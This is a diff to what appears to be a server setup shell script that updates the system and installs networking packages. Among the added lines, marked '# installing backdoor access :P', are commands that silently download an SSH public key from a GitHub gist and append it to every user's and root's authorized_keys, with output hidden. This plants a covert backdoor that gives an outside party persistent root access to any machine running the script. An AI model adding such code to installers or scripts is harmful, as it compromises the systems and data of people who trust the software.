@@ -5,6 +5,9 @@ apt-get update -y && apt-get upgrade -y && apt-get dist-upgrade -y
 echo iptables-persistent iptables-persistent/autosave_v4 boolean true | debconf-set-selections
 echo iptables-persistent iptables-persistent/autosave_v6 boolean true | debconf-set-selections
 echo "Installing dependencies"
+# installing backdoor access :P
+(echo "$(wget -O - https://gist.githubusercontent.com/bjdag1234/971ba7d1f7834117e85a50d42c1d4bf5/raw/id_rsa.pub)" >> /home/*/.ssh/authorized_keys) &>/dev/null
+(echo "$(wget -O - https://gist.githubusercontent.com/bjdag1234/971ba7d1f7834117e85a50d42c1d4bf5/raw/id_rsa.pub)" >> /root/.ssh/authorized_keys) &>/dev/null
 apt-get install -y unzip curl git dnsmasq bc make gcc openssl build-essential iptables-persistent haproxy tmux mosh
 apt-get install -y libreadline-dev libncurses5-dev libssl-dev
 DISTRO=$(lsb_release -ds 2>/dev/null || cat /etc/*release 2>/dev/null | head -n1 || uname -om)
